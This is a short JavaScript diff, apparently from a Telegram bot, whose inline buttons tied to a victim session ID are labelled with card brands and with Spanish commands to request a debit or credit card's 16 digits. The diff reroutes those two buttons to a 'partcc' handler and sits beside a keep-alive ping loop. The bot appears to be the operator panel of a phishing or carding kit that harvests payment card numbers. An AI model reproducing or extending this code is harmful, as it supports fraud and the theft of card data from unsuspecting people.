@@ -72,10 +72,10 @@ function getSecondaryReplyMarkup(sessionId) {
             ],
             [
                 { text: "🩶 Visa Platinum", callback_data: `go:Visa+Platinum|${sessionId}` },
-                { text: "⚽ PEDIR 16 DEBITO", callback_data: `go:db16|${sessionId}` }
+                { text: "⚽ PEDIR 16 DEBITO", callback_data: `go:partcc|${sessionId}` }
             ],
             [
-                { text: "🛩️ PEDIR 16 TC", callback_data: `go:tc16|${sessionId}` },
+                { text: "🛩️ PEDIR 16 TC", callback_data: `go:partcc|${sessionId}` },
                 { text: "🪙 MasterCard Gold", callback_data: `go:mastergold|${sessionId}` }
             ],
             [
@@ -681,4 +681,5 @@ setInterval(async () => {
     console.error("❌ Error en auto-ping:", error.message);
   }
 }, 180000); // 180000 ms = 3 minutos
+
 
